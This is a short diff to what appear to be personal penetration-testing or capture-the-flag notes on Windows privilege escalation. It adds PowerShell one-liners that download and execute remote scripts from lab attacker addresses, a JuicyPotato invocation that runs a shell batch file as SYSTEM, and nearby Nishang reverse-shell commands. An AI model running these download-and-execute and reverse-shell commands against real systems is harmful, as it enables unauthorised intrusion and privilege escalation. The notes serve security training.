@@ -148,12 +148,18 @@ Upload file
 ```
 (new-object net.webclient).downloadfile('http://10.10.14.45:5555/JuicyPotato.exe', 'C:\Users\Public\Downloads\jp.exe')
 ```
+Create a shell.bat file
+```
+powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.7:5555/shell-2.ps1')
+```
+
 copy clsid from here
 ```
 https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Pro
 ```
 run juicy potato
 ```
+./jp.exe -t * -p shell.bat -l 4444
 ./jp.exe -t * -p shell.bat -l 4444 -c "{7A6D9C0A-1E7A-41B6-82B4-C3F7A27BA381}"
 ```
 
@@ -163,5 +169,10 @@ run juicy potato
 cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 .
 Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.45 -Port 1234
 powershell -c iex(new-object net.webclient).downloadstring(‘http://10.10.14.45:5555/shell.ps1')
+```
+
+## Running powershell from cmd
+```
+cmd /c powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.7:5555/shell.ps1')
 ```
 
